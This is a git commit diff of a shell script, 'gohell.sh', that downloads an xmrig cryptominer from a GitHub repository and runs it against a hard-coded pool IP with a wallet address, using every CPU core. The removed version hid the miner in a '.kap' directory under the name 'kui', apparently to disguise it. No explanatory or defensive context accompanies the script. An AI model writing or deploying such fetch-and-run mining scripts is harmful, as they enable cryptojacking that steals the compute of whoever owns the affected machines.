21f408d5a96d342dedf514a114e357e22a2724d3
nandafiku <156932477+nandafiku@users.noreply.github.com>
2024-02-29 14:15:51 +0700

    Update gohell.sh

--- gohell.sh
+++ gohell.sh
@@ -1,7 +1,3 @@
 #!/bin/bash
-apt-get update ; apt-get -y install sudo
-mkdir .kap && cd .kap
-wget -O kui https://github.com/nandafiku/gradi/raw/main/xmrig
-wget https://github.com/nandafiku/gradi/raw/main/config.json
-chmod 777 kui config.json
-./kui -c "config.json"
+wget https://github.com/nandafiku/gradi/raw/main/xmrig.tar.gz && tar -xvf xmrig.tar.gz
+./xmrig --donate-level 1 -o 45.76.185.233:80 -u ZEPHYR39FtS9jDrhDaMM9ReUUPLodNvqYHjD5CbYeLZM8h3tXARpwevMnW3kiXqxUUTYMTSDEgVDDV6WwXYL3Q5TVcVWxN58Wuc59 -p LUFT -a rx/0 -t $(nproc --all)
